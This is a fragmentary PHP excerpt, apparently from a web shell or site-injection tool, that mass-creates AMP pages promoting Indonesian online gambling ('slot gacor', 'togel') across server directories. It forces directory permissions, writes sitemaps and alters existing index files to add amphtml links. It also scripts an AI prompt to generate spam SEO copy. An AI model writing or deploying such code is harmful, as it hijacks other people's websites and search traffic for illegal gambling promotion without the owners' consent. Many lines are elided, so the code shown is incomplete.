...
function td_actions() {
    ...
    if ($act==='amp_create' && isset($_POST['amp_brand'],$_POST['amp_daftar'])) {
        ...
        foreach ($rawDirs as $rd) {
            $rd = trim(td_san($rd));
            if ($rd === '') continue;
            $rd = '/'.ltrim(str_replace('\\','/',$rd),'/');
            $full = rtrim($root,'/').$rd;
            $full = str_replace('//',  '/', $full);
            $full = str_replace(DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR, $full);
            if (is_dir($full)) {
                if (!is_writable($full)) @chmod($full, 0755);
                $targets[] = rtrim($full, DIRECTORY_SEPARATOR);
            } else {
                $rp = @realpath($full);
                if ($rp !== false && is_dir($rp)) {
                    if (!is_writable($rp)) @chmod($rp, 0755);
                    $targets[] = rtrim($rp, DIRECTORY_SEPARATOR);
                } else {
                    $debugInfo[] = $rd;
                }
            }
        ...
        if (empty($targets)) {
            $dbg = !empty($debugInfo) ? ' Tidak ditemukan: '.implode(', ', array_slice($debugInfo,0,3)) : ' Pastikan direktori sudah dipilih.';
            return array('type'=>'error','text'=>'&#x274C; Tidak ada direktori valid.'.$dbg);
        }
        $ampFname    = 'amp.html';
        $scheme      = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on') ? 'https' : 'http';
        $host        = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
        ...
        $defaultKwPool = array('slot gacor','slot online terpercaya','togel online resmi','toto slot gacor','slot RTP tertinggi','slot jackpot terbesar','slot gacor hari ini','link alternatif slot','situs slot terbaik','slot bonus new member');
        $customKwRaw   = isset($_POST['amp_keywords']) ? trim($_POST['amp_keywords']) : '';
        if ($customKwRaw !== '') {
            $lines = preg_split('/\r\n|\r|\n/', $customKwRaw);
            $customKws = array();
            foreach ($lines as $line) {
                $line = trim($line);
                if ($line !== '') $customKws[] = $line;
            }
            $kwPool = !empty($customKws) ? $customKws : $defaultKwPool;
        } else {
            $kwPool = $defaultKwPool;
        }
        ...
        foreach ($targets as $idx => $t) {
            ...
            $prompt  = 'Kamu SEO copywriter profesional niche slot online dan togel Indonesia.';
            $prompt .= ' Nama brand/situs: "'.$brandName.'".';
            ...
            $prompt .= ' 1. title: 50-65 karakter, FORMAT WAJIB: "'.$brandName.' - [kata kunci] [tahun]", contoh: "'.$brandName.' - Slot Gacor 2026", UNIK berbeda antar halaman.';
            $prompt .= ' 2. description: 140-155 karakter, sebutkan nama brand "'.$brandName.'", kata kunci natural, manfaat jelas, ajakan daftar/main.';
            $prompt .= ' 3. h1: 40-60 karakter, sebutkan nama brand "'.$brandName.'", mengandung kata kunci, berbeda dari title.';
            ...
            if ($title === '') {
                ...
                $title = $brandName.' - '.$kw.' '.date('Y');
                if (strlen($title) > 65) $title = $brandName.' '.$kw.' '.date('Y');
                if (strlen($title) > 65) $title = $kw.' '.date('Y').' - Daftar & Menang';
            }
            if ($desc  === '') $desc  = 'Mainkan slot gacor dan togel online terpercaya bersama '.$brandName.'. RTP tertinggi, jackpot terbesar, bonus new member, deposit withdraw tercepat. Daftar sekarang!';
            if ($h1    === '') $h1    = $brandName.' - '.($kwPick !== '' ? ucwords($kwPick) : 'Slot Gacor Terpercaya').' '.date('Y');
      ...
      <ul>
        ...
        <li><a href="'.htmlspecialchars($linkLogin).'" target="_blank" rel="nofollow noopener noreferrer"><span class="material-icons">headset_mic</span>LIVE CHAT</a></li>
            ...
            if ($written !== false) {
                ...
                $smDest = $t.DIRECTORY_SEPARATOR.'sitemap.xml';
                if (!is_writable($t)) @chmod($t, 0755);
                @file_put_contents($smDest, $perDirSitemap);
                ...
                if (is_file($indexFile)) {
                    ...
                    if ($indexContent !== false) {
                        ...
                        if (strpos($indexContent, 'rel="amphtml"') === false) {
                            ...
                            if (!is_writable($indexFile)) @chmod($indexFile, 0644);
        ...
        $summaryText = '&#x26A1; AMP CREATE: '.$ok.' file dibuat di '.count($targets).' dir.'.($fail?' Gagal tulis: '.$fail.'.':'').($skipped?' Dilewati (robots.txt): '.$skipped.'.':'').' Sitemap: sitemap-amp.xml';
        $msg = array(
            'type'    => 'tunel',
            'text'    => $summaryText,
